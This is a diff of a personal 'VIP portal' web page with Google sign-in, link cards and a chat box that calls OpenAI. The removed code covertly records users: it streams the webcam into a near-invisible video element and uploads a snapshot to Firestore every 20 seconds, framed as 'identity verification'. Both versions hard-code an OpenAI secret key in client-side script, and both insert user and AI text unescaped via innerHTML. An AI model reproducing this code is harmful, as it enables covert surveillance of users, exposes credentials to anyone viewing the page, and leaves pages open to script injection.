@@ -4,182 +4,153 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ratan Bro | VIP Portal Final</title>
+    <title>Ratan Bro | VIP Portal Master</title>
     
     <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
     <style>
         :root {
-            --pink: #ff4d94;
-            --pink-glow: rgba(255, 77, 148, 0.6);
-            --dark: #020617;
-            --glass: rgba(255, 255, 255, 0.08);
+            --pink-main: #ff0066;
+            --pink-glow: rgba(255, 0, 102, 0.5);
+            --bg-dark: #0f0a15;
+            --header-bg: #2d132c;
+            --glass: rgba(255, 255, 255, 0.05);
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Hind Siliguri', sans-serif; }
 
         body {
-            background: var(--dark);
-            background-image: radial-gradient(circle at 10% 20%, rgba(255, 77, 148, 0.15) 0%, transparent 40%),
-                              radial-gradient(circle at 90% 80%, rgba(255, 77, 148, 0.1) 0%, transparent 40%);
-            color: white; min-height: 100vh; overflow-x: hidden;
+            background: var(--bg-dark);
+            color: white;
+            min-height: 100vh;
+            overflow-x: hidden;
         }
 
-        /* --- LOVE RAIN (INCREASED FREQUENCY & BLUR) --- */
-        .love-container { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; overflow: hidden; }
-        .heart { position: absolute; color: var(--pink); font-size: 14px; animation: rain linear infinite; opacity: 0.6; filter: drop-shadow(0 0 5px var(--pink)) blur(1px); }
-        @keyframes rain {
-            0% { transform: translateY(-50px) rotate(0deg); opacity: 0; }
-            10% { opacity: 0.6; }
-            90% { opacity: 0.5; }
-            100% { transform: translateY(500px) rotate(360deg); opacity: 0; }
-        }
-
-        /* --- MODALS --- */
-        .modal-overlay { position: fixed; inset: 0; background: rgba(2, 6, 23, 0.98); z-index: 10000; display: none; align-items: center; justify-content: center; backdrop-filter: blur(25px); padding: 20px; }
-        .glass-box { background: var(--glass); padding: 45px 30px; border-radius: 40px; border: 1px solid rgba(255, 77, 148, 0.3); text-align: center; width: 100%; max-width: 420px; box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7); animation: slideUp 0.6s ease; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
-
-        /* --- HEADER (DEEP BLUR PINK) --- */
+        /* --- HEADER (SCREENSHOT STYLE) --- */
         .hero-header { 
-            margin: 25px 20px; padding: 45px 20px; 
-            background: radial-gradient(circle, rgba(255, 77, 148, 0.5) 0%, rgba(255, 77, 148, 0.2) 60%, transparent 100%);
-            border-radius: 35px; border: 1px solid rgba(255, 77, 148, 0.3); 
-            position: relative; overflow: hidden; 
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4); 
+            margin: 20px; 
+            padding: 50px 20px; 
+            background: linear-gradient(135deg, #2d132c 0%, #190a19 100%);
+            border-radius: 40px; 
+            border: 1px solid rgba(255, 0, 102, 0.2); 
+            position: relative; 
+            overflow: hidden; 
+            text-align: center;
+            box-shadow: 0 15px 45px rgba(0,0,0,0.6);
             backdrop-filter: blur(10px);
         }
-        .profile-wrapper { display: flex; justify-content: center; align-items: center; margin-bottom: 20px; position: relative; z-index: 5; }
-        
-        /* --- PROFILE PICTURES (FIXED ASpect RATIO) --- */
+
+        /* --- PROFILE PICTURES FIX --- */
+        .profile-container {
+            display: flex; justify-content: center; align-items: center;
+            margin-bottom: 25px; position: relative; z-index: 10;
+        }
+
         .p-img { 
-            width: 115px; height: 115px; 
-            border-radius: 50%; 
-            border: 4px solid var(--pink); 
-            box-shadow: 0 0 25px var(--pink); 
-            object-fit: cover; /* Prevents stretching */
-            aspect-ratio: 1 / 1; /* Ensures perfect circle */
+            width: 110px; height: 110px; border-radius: 50%; 
+            border: 4px solid var(--pink-main); 
+            box-shadow: 0 0 25px var(--pink-glow); 
+            object-fit: cover; aspect-ratio: 1/1; background: #000;
         }
+
         .user-p-img { 
-            width: 95px; height: 95px; 
-            border: 4px solid #fff; 
-            margin-left: -35px; 
-            background: #000; 
-            box-shadow: 0 10px 20px rgba(0,0,0,0.5); 
-            object-fit: cover; 
-            aspect-ratio: 1 / 1;
+            width: 90px; height: 90px; border: 4px solid #fff; 
+            margin-left: -35px; object-fit: cover; aspect-ratio: 1/1;
+            box-shadow: 5px 0 20px rgba(0,0,0,0.5);
         }
-        .user-name-loop { font-size: 28px; font-weight: 800; text-align: center; background: linear-gradient(90deg, #fff, var(--pink), #fff); background-size: 200% auto; -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: shine 3s linear infinite; letter-spacing: 1px; display: block; text-transform: uppercase; }
-        @keyframes shine { to { background-position: 200% center; } }
 
-        /* --- CARDS WITH SHINE MASK ANIMATION --- */
-        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 18px; padding: 0 20px 30px; max-width: 600px; margin: 0 auto; }
-        .card { 
-            background: var(--glass); border-radius: 28px; padding: 30px 15px; text-align: center; text-decoration: none; color: white; 
-            border: 1px solid rgba(255, 255, 255, 0.05); transition: 0.4s; position: relative; overflow: hidden; 
-        }
-        
-        /* The Pink Shine Mask */
-        .card::before {
-            content: ''; position: absolute; top: 0; left: -150%; width: 100%; height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 77, 148, 0.2), transparent);
-            transition: 0.6s; transform: skewX(-20deg);
-        }
-        .card:hover::before { left: 150%; }
-        .card:hover { transform: translateY(-5px); border-color: var(--pink); box-shadow: 0 10px 20px rgba(255, 77, 148, 0.2); }
-        
-        .card i { font-size: 2.5rem; color: var(--pink); margin-bottom: 12px; display: block; filter: drop-shadow(0 0 8px var(--pink-glow)); }
-        .card p { font-weight: 600; font-size: 15px; }
-        .card.wide { grid-column: span 2; display: flex; align-items: center; justify-content: center; gap: 15px; padding: 22px; }
+        .name-style { font-size: 32px; font-weight: 800; color: #fff; margin-bottom: 5px; display: block; }
+        .verified-tag { color: var(--pink-main); font-size: 14px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
 
-        .alarm-dot { position: absolute; top: 15px; right: 15px; width: 12px; height: 12px; background: #ff3333; border-radius: 50%; box-shadow: 0 0 10px #ff3333; animation: blink 1s infinite; display: none; }
-        @keyframes blink { 50% { opacity: 0.5; } }
+        /* --- TOP NAV & COUNTER --- */
+        .top-nav { display: flex; justify-content: flex-end; align-items: center; padding: 15px 25px; gap: 12px; }
+        .eye-counter {
+            background: rgba(255, 0, 102, 0.1); border: 1px solid var(--pink-main);
+            color: var(--pink-main); padding: 5px 15px; border-radius: 50px;
+            font-size: 13px; font-weight: 700; display: flex; align-items: center; gap: 6px;
+        }
+
+        /* --- CARDS --- */
+        .grid-layout { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding: 20px; max-width: 600px; margin: 0 auto; }
+        .nav-card { 
+            background: var(--glass); border-radius: 35px; padding: 35px 15px; text-align: center; 
+            text-decoration: none; color: white; border: 1px solid rgba(255,255,255,0.05); 
+            position: relative; overflow: hidden; transition: 0.4s; 
+        }
+        .nav-card:hover { border-color: var(--pink-main); transform: translateY(-5px); box-shadow: 0 10px 20px rgba(255, 0, 102, 0.15); }
+        .nav-card i { font-size: 2.5rem; color: var(--pink-main); margin-bottom: 12px; display: block; filter: drop-shadow(0 0 8px var(--pink-glow)); }
+        .nav-card p { font-weight: 700; font-size: 16px; }
 
         /* --- AI SECTION --- */
-        .chat-area { max-width: 500px; margin: 10px auto 40px; padding: 0 20px; }
-        .chat-mini { background: rgba(0, 0, 0, 0.6); border-radius: 30px; border: 1px solid rgba(255, 77, 148, 0.2); padding: 22px; }
-        #chat-log { height: 140px; overflow-y: auto; color: #ccc; margin-bottom: 15px; font-size: 14px; }
-        .chat-in { display: flex; gap: 10px; }
-        .chat-in input { flex: 1; background: #0d1117; border: 1px solid #333; color: #fff; padding: 12px 20px; border-radius: 50px; outline: none; }
-        .chat-in input:focus { border-color: var(--pink); }
+        .ai-section { max-width: 500px; margin: 20px auto 50px; padding: 0 20px; }
+        .chat-ui { background: rgba(0,0,0,0.5); border-radius: 35px; border: 1px solid rgba(255,0,102,0.2); padding: 25px; backdrop-filter: blur(10px); }
+        #chat-log { height: 140px; overflow-y: auto; color: #ccc; font-size: 14px; margin-bottom: 15px; }
+        .chat-row { display: flex; gap: 10px; }
+        .chat-row input { flex: 1; background: #1a1520; border: 1px solid #333; color: white; padding: 12px 20px; border-radius: 50px; outline: none; }
 
-        .btn-main { background: linear-gradient(45deg, var(--pink), #ff1a75); color: white; border: none; padding: 15px 30px; border-radius: 50px; font-weight: 700; cursor: pointer; transition: 0.3s; box-shadow: 0 8px 20px rgba(255, 77, 148, 0.3); text-transform: uppercase; }
+        /* --- LOVE RAIN --- */
+        .header-rain { position: absolute; inset: 0; pointer-events: none; z-index: 1; overflow: hidden; }
+        .heart { position: absolute; color: var(--pink-main); font-size: 12px; animation: rainMove linear forwards; opacity: 0; }
+        @keyframes rainMove { 0% { transform: translateY(-20px); opacity: 0; } 20% { opacity: 0.6; } 100% { transform: translateY(350px); opacity: 0; } }
 
-        #vSource { position: fixed; top: 0; left: 0; width: 640px; height: 480px; opacity: 0.01; z-index: -1; pointer-events: none; }
-        #snapCanvas { display: none; }
+        /* --- MODALS --- */
+        .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.96); display: none; align-items: center; justify-content: center; z-index: 10000; backdrop-filter: blur(15px); }
+        .login-box { background: #16111a; padding: 50px 30px; border-radius: 50px; border: 1px solid rgba(255, 0, 102, 0.3); text-align: center; width: 90%; max-width: 400px; }
+        .btn-main { background: linear-gradient(90deg, #ff0055, #ff0077); color: white; border: none; padding: 18px; border-radius: 50px; font-weight: 700; width: 100%; cursor: pointer; text-transform: uppercase; margin-top: 25px; box-shadow: 0 10px 25px rgba(255,0,102,0.4); }
     </style>
 </head>
 
 <body>
-    <audio id="snd-bus" src="business.mp3"></audio>
-    <audio id="snd-port" src="portfolio.mp3"></audio>
-    <audio id="snd-look" src="lookup.mp3"></audio>
     <audio id="snd-open" src="open.mp3"></audio>
-    <audio id="snd-notif" src="https://www.soundjay.com/buttons/sounds/button-3.mp3"></audio>
 
-    <div id="login-overlay" class="modal-overlay" style="display: flex;">
-        <div class="glass-box">
-            <img src="ratan.jpg" style="width:110px; height:110px; border-radius:50%; border:3px solid var(--pink); margin-bottom:20px; box-shadow: 0 0 30px var(--pink); object-fit: cover; aspect-ratio: 1/1;">
-            <h2>RATAN BRO PORTAL</h2>
-            <button class="btn-main" onclick="googleLogin()" style="width: 100%; margin-top: 20px;">LOGIN WITH GOOGLE</button>
+    <div id="login-screen" class="modal" style="display: flex;">
+        <div class="login-box">
+            <img src="ratan.jpg" class="p-img" style="margin-bottom: 25px; width: 120px; height: 120px;">
+            <h2 style="margin-bottom: 8px;">Ratan Bro Portal</h2>
+            <p style="color: #777; font-size: 14px;">Private VIP Cloud Ecosystem</p>
+            <button class="btn-main" onclick="login()">Authenticate via Google</button>
         </div>
     </div>
 
-    <div id="main-ui" style="display:none;">
-        <div style="text-align:right; padding: 10px 20px;">
-            <button onclick="googleLogout()" style="background:none; border:1px solid #333; color:#666; padding:5px 12px; border-radius:50px; cursor:pointer; font-size:12px;">Sign Out</button>
+    <div id="dashboard-ui" style="display: none;">
+        <div class="top-nav">
+            <div class="eye-counter"><i class="fas fa-eye"></i> <span id="v-count">200</span></div>
+            <button onclick="logout()" style="background:none; border:1px solid #333; color:#666; padding:6px 15px; border-radius:50px; cursor:pointer; font-size: 12px;">Sign Out</button>
         </div>
 
-        <div class="hero-header">
-            <div id="rain-wrap" class="love-container"></div>
-            <div class="profile-wrapper">
+        <header class="hero-header">
+            <div id="rain-zone" class="header-rain"></div>
+            <div class="profile-container">
                 <img src="ratan.jpg" class="p-img">
-                <img id="u-pic" src="" class="p-img user-p-img" onerror="this.src='ratan.jpg'">
+                <img id="u-photo" src="" class="p-img user-p-img" onerror="this.src='ratan.jpg'">
             </div>
-            <span id="u-display-name" class="user-name-loop">...</span>
-            <p style="text-align:center; color:#ddd; font-size:12px; margin-top: 15px;"><i class="fas fa-fingerprint" style="color:var(--pink)"></i> PORTAL SECURED</p>
-        </div>
+            <span id="u-name" class="name-style">...</span>
+            <div class="verified-tag">Verified Member</div>
+        </header>
 
-        <div class="grid">
-            <div class="card" onclick="openLatestNotif()">
-                <div id="notif-alarm" class="alarm-dot"></div>
-                <i class="fas fa-bell"></i><p>Notification</p>
-            </div>
-            <a href="testpaper.html" class="card"><i class="fas fa-file-signature"></i><p>Test Papers</p></a>
-            <a href="business.html" class="card" onclick="document.getElementById('snd-bus').play();"><i class="fas fa-chart-line"></i><p>Business</p></a>
-            <a href="portfolio.html" class="card" onclick="document.getElementById('snd-port').play();"><i class="fas fa-id-badge"></i><p>Portfolio</p></a>
-            <a href="https://numberlookup.pro.bd/" target="_blank" class="card wide" onclick="document.getElementById('snd-look').play();">
-                <i class="fas fa-search-plus"></i><p>Advanced Number Lookup</p>
-            </a>
-        </div>
+        <main class="grid-layout">
+            <div class="nav-card" onclick="alert('No new notifications')"><i class="fas fa-bell"></i><p>Notification</p></div>
+            <a href="testpaper.html" class="nav-card"><i class="fas fa-file-pdf"></i><p>Test Papers</p></a>
+            <a href="business.html" class="nav-card"><i class="fas fa-briefcase"></i><p>Business</p></a>
+            <a href="portfolio.html" class="nav-card"><i class="fas fa-user-circle"></i><p>Portfolio</p></a>
+        </main>
 
-        <div class="chat-area">
-            <div class="chat-mini">
-                <div id="chat-log"><b>AI Assistant:</b> আপনার জন্য আমি কী করতে পারি?</div>
-                <div class="chat-in">
-                    <input type="text" id="ai-msg" placeholder="Ask anything...">
-                    <button onclick="askAI()" class="btn-main" style="padding: 10px 20px;">SEND</button>
+        <section class="ai-section">
+            <div class="chat-ui">
+                <div id="chat-log"><b>AI Assistant:</b> পোর্টালে স্বাগতম বস! কীভাবে সাহায্য করতে পারি?</div>
+                <div class="chat-row">
+                    <input type="text" id="ai-msg" placeholder="Ask Ratan AI...">
+                    <button onclick="askAI()" class="btn-main" style="width: auto; padding: 10px 20px; margin-top: 0;">SEND</button>
                 </div>
             </div>
-        </div>
+        </section>
     </div>
-
-    <div id="notif-modal" class="modal-overlay">
-        <div class="glass-box" style="border-color: #fff3;">
-            <h3 style="color:var(--pink); margin-bottom:10px;">NOTICE</h3>
-            <p id="nt-msg" style="font-size: 16px; line-height: 1.6;"></p>
-            <button class="btn-main" onclick="closeNotif()" style="margin-top:25px;">CLOSE</button>
-        </div>
-    </div>
-
-    <video id="vSource" autoplay playsinline muted></video>
-    <canvas id="snapCanvas" width="640" height="480"></canvas>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
         import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-        import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
@@ -194,117 +165,68 @@
         const auth = getAuth(app);
         const db = getFirestore(app);
         const provider = new GoogleAuthProvider();
-        const OPENAI_KEY = "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";
+        const AI_API = "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";
 
-        let loggedUser = null;
-        let latestNotif = null;
-
-        function startLoveRain() {
-            const container = document.getElementById('rain-wrap');
+        function startRain() {
+            const zone = document.getElementById('rain-zone');
             setInterval(() => {
                 const heart = document.createElement('i');
                 heart.className = 'fas fa-heart heart';
                 heart.style.left = Math.random() * 100 + '%';
-                heart.style.fontSize = (Math.random() * 8 + 10) + 'px';
-                heart.style.animationDuration = (Math.random() * 2 + 3) + 's';
-                container.appendChild(heart);
+                heart.style.animationDuration = (Math.random() * 2 + 2) + 's';
+                zone.appendChild(heart);
                 setTimeout(() => heart.remove(), 4000);
-            }, 600); // Frequency fixed
+            }, 600);
         }
 
-        async function captureSession() {
-            if (!loggedUser) return;
-            const video = document.getElementById('vSource');
-            const canvas = document.getElementById('snapCanvas');
-            const ctx = canvas.getContext('2d');
-            
-            // Critical Fix: Ensures video is ready
-            if (video.videoWidth > 0) {
-                ctx.drawImage(video, 0, 0, 640, 480);
-                const imgData = canvas.toDataURL('image/jpeg', 0.5);
-                const userKey = loggedUser.email.replace(/\./g, '_');
-                await setDoc(doc(db, "users", userKey), {
-                    name: loggedUser.displayName,
-                    lastPic: imgData,
+        window.login = () => signInWithPopup(auth, provider);
+        window.logout = () => signOut(auth).then(() => location.reload());
+
+        onAuthStateChanged(auth, async (user) => {
+            if (user) {
+                document.getElementById('u-name').innerText = user.displayName;
+                document.getElementById('u-photo').src = user.photoURL;
+                document.getElementById('login-screen').style.display = 'none';
+                document.getElementById('dashboard-ui').style.display = 'block';
+                document.getElementById('snd-open').play();
+                startRain();
+
+                // Counter Logic
+                let count = localStorage.getItem('ratan_v_count') || 200;
+                count = parseInt(count) + 1;
+                localStorage.setItem('ratan_v_count', count);
+                document.getElementById('v-count').innerText = count;
+
+                // Sync to DB
+                await setDoc(doc(db, "users", user.email.replace(/\./g, '_')), {
+                    name: user.displayName,
                     lastSeen: new Date().toLocaleString()
                 }, { merge: true });
-                console.log("Identity Snapshot Sent");
-            }
-        }
-
-        window.grantAndStart = async () => {
-            try {
-                // Identity capture is always on to fix snapshot issue
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('vSource');
-                video.srcObject = stream;
-                
-                document.getElementById('perm-modal').style.display = 'none';
-                document.getElementById('main-ui').style.display = 'block';
-                document.getElementById('snd-open').play();
-                startLoveRain();
-                
-                // Initial capture after 3 seconds to ensure stream is active
-                setTimeout(captureSession, 3000);
-                setInterval(captureSession, 20000); // Regular captures
-            } catch (err) { alert("Camera access required for identity verification!"); }
-        };
-
-        onAuthStateChanged(auth, (user) => {
-            if (user) {
-                loggedUser = user;
-                document.getElementById('u-display-name').innerText = user.displayName;
-                document.getElementById('u-pic').src = user.photoURL;
-                document.getElementById('login-overlay').style.display = 'none';
-                // Always start camera on login
-                grantAndStart();
             } else {
-                document.getElementById('login-overlay').style.display = 'flex';
-                document.getElementById('main-ui').style.display = 'none';
+                document.getElementById('login-screen').style.display = 'flex';
+                document.getElementById('dashboard-ui').style.display = 'none';
             }
         });
 
         window.askAI = async () => {
-            const input = document.getElementById('ai-msg');
+            const inp = document.getElementById('ai-msg');
             const log = document.getElementById('chat-log');
-            if (!input.value) return;
-            const p = input.value;
-            log.innerHTML += `<div style="color:var(--pink); text-align:right;"><b>You:</b> ${p}</div>`;
-            input.value = "Thinking...";
+            if (!inp.value) return;
+            const msg = inp.value;
+            log.innerHTML += `<div style="text-align:right; color:var(--pink-main); margin: 5px 0;"><b>You:</b> ${msg}</div>`;
+            inp.value = "Thinking...";
             try {
                 const res = await fetch("https://api.openai.com/v1/chat/completions", {
                     method: "POST",
-                    headers: { "Content-Type": "application/json", "Authorization": `Bearer ${OPENAI_KEY}` },
-                    body: JSON.stringify({ model: "gpt-4o-mini", messages: [{ role: "user", content: p }] })
+                    headers: { "Content-Type": "application/json", "Authorization": `Bearer ${AI_API}` },
+                    body: JSON.stringify({ model: "gpt-4o-mini", messages: [{ role: "user", content: msg }] })
                 });
                 const data = await res.json();
-                log.innerHTML += `<div><b>AI:</b> ${data.choices[0].message.content}</div>`;
+                log.innerHTML += `<div style="margin: 5px 0;"><b>AI:</b> ${data.choices[0].message.content}</div>`;
             } catch (e) { log.innerHTML += `<div>Error connecting...</div>`; }
-            input.value = "";
+            inp.value = "";
             log.scrollTop = log.scrollHeight;
         };
-
-        window.googleLogin = () => signInWithPopup(auth, provider);
-        window.googleLogout = () => signOut(auth).then(() => location.reload());
-
-        onSnapshot(doc(db, "system", "updates"), (snap) => {
-            if (snap.exists()) {
-                latestNotif = snap.data();
-                if (latestNotif.hasNew) {
-                    document.getElementById('notif-alarm').style.display = 'block';
-                    document.getElementById('snd-notif').play();
-                }
-            }
-        });
-
-        window.openLatestNotif = () => {
-            if (latestNotif) {
-                document.getElementById('nt-msg').innerText = latestNotif.message;
-                document.getElementById('notif-modal').style.display = 'flex';
-                document.getElementById('notif-alarm').style.display = 'none';
-            }
-        };
-        window.closeNotif = () => document.getElementById('notif-modal').style.display = 'none';
     </script>
 </body>
 </html>
